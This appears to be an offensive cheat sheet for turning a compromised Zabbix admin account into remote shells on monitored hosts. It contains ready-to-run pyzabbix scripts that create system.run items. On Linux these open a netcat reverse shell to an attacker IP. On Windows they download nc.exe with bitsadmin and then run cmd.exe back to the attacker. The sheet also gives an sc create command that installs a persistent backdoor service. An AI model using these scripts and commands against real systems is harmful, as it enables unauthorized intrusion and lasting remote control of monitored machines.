# Somehow you've got access to the zabbix admin account or created your own (taking advantage of this [guide](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet/blob/master/Zabbix_session_hijacking.md)). Time for some RCE on the monitored hosts!

In Zabbix we got ability to run remote commands. This will work in the next state of the agent configuration file:
1. The value of the ServerActive parameter is the same as the value of the Server parameter.
2. The Hostname parameter matches the name specified for the host in the Zabbix server's web interface.
3. EnableRemoteCommands = 1 - Enables the launch of commands that the server sends to the agent.
4. Timeout = 30 – Specifies how long we wait for agent. Must be between 1 and 30. (Because of this option we can't get persistent shell)

It is also important to remember that the command length is limited to 255 characters.
As a result, a successful scenario is the addition of a task to create a shell in Zabbix which will be accessible for 30 seconds(in the best scenario) and during his lifetime add an independent persistent shell.

If you are too lazy to login to the web interface, you can use this script and get information about the agents that Zabbix monitors.
```python
from pyzabbix import ZabbixAPI
api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
zbx_sessionid= raw_input("enter zbx_sessionid: \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
zapi = ZabbixAPI(api_address)
zapi.login(user, password)
print("Connected to Zabbix API Version %s" % zapi.api_version())
for h in zapi.host.get(output="extend"):
    hostid=h['hostid']
    host=h['host']
    print ("found host: ",host,"hostid: ",hostid)  
```
Result:
<a href="url"><img src="https://image.prntscr.com/image/st11XKYfSneLiSUS5D_Wpg.png" align="justify"></a>

## Meet the Unix!
<a href="url"><img src="http://2.bp.blogspot.com/-8BLUZTtUu0M/T_TFQ3oTl4I/AAAAAAAAA4Q/bI19ps683ow/s1600/heavy_house_sm.jpg" align="justify" width="800"></a>

And this homie will help us put the task to launch the shell using netcat:

```python
from pyzabbix import ZabbixAPI, ZabbixAPIException
import sys
api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
hostname=raw_input("enter hostname: \n")
# hostid=raw_input("enter hostid: \n")
zapi = ZabbixAPI(api_address)
# Login to the Zabbix API
zapi.login(user, password)
host_name = hostname
hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"])
if hosts:
    host_id = hosts[0]["hostid"]
    print("Found host id {0}".format(host_id))
    try:
        item = zapi.item.create(
            hostid=host_id,
            name='netcat_create_reverse_shell',
            key_='system.run["nc 192.168.56.100 4444 -e /bin/bash"]',
            type=0,
            value_type=4,
            interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
            delay=5
        )
    except ZabbixAPIException as e:
        print(e)
        sys.exit()
    print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name))
else:
    print("No hosts found")
```

How it's look:
<a href="url"><img src="https://image.prntscr.com/image/_XY5FGfGQHay0QfjdIA-zQ.png" align="justify"></a>

Connect to our shell:
<a href="url"><img src="https://image.prntscr.com/image/jj3K7VPaQiydQDiKuZnW9w.png" align="justify"></a>

Now you have to gain a foothold in the system and leave the persistent shell, are you already old enough to do it yourself?

## Windows time!
<a href="url"><img src="http://goldwallpapers.com/uploads/posts/pyro-wallpaper/pyro_wallpaper_012.jpg" align="justify" width="800"></a>

By default, in Windows the agent is installed and started as a service with System privileges. For example, we use the same netcat, which will be downloaded from our server.
```python
from pyzabbix import ZabbixAPI, ZabbixAPIException
import sys
api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
host_name=raw_input("enter hostname: \n")
# hostid=raw_input("enter hostid: \n")
zapi = ZabbixAPI(api_address) # user='Admin', password='zabbix')
# Login to the Zabbix API
zapi.login(user, password)
# host_name = 'Zabbix_server'
# host_name = "windows host"
hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"])
if hosts:
    host_id = hosts[0]["hostid"]
    print("Found host id {0}".format(host_id))
    try:
        item = zapi.item.create(
            hostid=host_id,
            name='netcat_create_reverse_shell',
            key_='system.run["bitsadmin.exe /transfer /download http://192.168.56.100/nc.exe C:\\Temp\\nc.exe && C:\Temp\\nc.exe 192.168.56.100 5555 -e cmd.exe"]',
            type=0,
            value_type=4,
            interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
            delay=30
        )
    except ZabbixAPIException as e:
        print(e)
        sys.exit()
    print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name))
else:
    print("No hosts found")
```

<a href="url"><img src="https://image.prntscr.com/image/NMG_MUJcTUOd3LasW2diuw.png" align="justify"></a>

And then...
<a href="url"><img src="https://image.prntscr.com/image/DOFyZ-ASQXGC6j7nfvSZUw.png" align="justify"></a>

Here we also will interfere with 30 sec timeout, so we'll make a permanent shell.

The agent is started as a service - so the file can be changed, it is enough for it to register a task on the server. For example we can create item which will use remote commands to append the necessary lines to the end of the configuration file.
What's about our shell? To do this, try to create a service (rights allow us), which will also raise the tunnel with nc. We will create a command to create the service, save it to a file, and then redirect it to the input nc (file service.txt):

sc create reversencbackdoor binpath= "cmd /C C:\Users\Public\nc.exe 192.168.56.100 6666 -e cmd.exe" type= own start= auto DisplayName= "NC service backdoor"

To manage the service we use the same approach, only the commands will be changed (file service_run.txt):
```bash
sc query reversencbackdoor
sc stop reversencbackdoor
sc start reversencbackdoor
```
As a result:
<a href="url"><img src="https://image.prntscr.com/image/SDUk9Bp2StmUnuGxv2Qt7g.png" align="justify"></a>

To connect, we start listening on port 6666 and start the service, without this the service starts and immediately ends its work.

<a href="url"><img src="https://image.prntscr.com/image/bITGe7b4RgSAAowewkb5Dw.png" align="justify"></a>

At this moment in separate window:

<a href="url"><img src="https://image.prntscr.com/image/TFjahUmCQH6seiBA_78lvw.png" align="justify"></a>

After Zabbix service will cease to exist, we will have a permanent shell from the service, which will connect to 6666 port:

<a href="url"><img src="https://image.prntscr.com/image/jdY7_RTfS6G8UThnmEE-Ug.png" align="justify"></a>

## Good job, folk! See ya soon

P.S.
Huge respect to [Shodin](https://github.com/freeworkaz) for his contribution to this cheatsheet. The latest versions of these scripts can be found [here](https://github.com/freeworkaz/zabbix_test). Also you can watch the [videos](https://www.youtube.com/channel/UC4wr-m-_6kRz2cHkdtRbW2g/videos) for a deeper understanding.
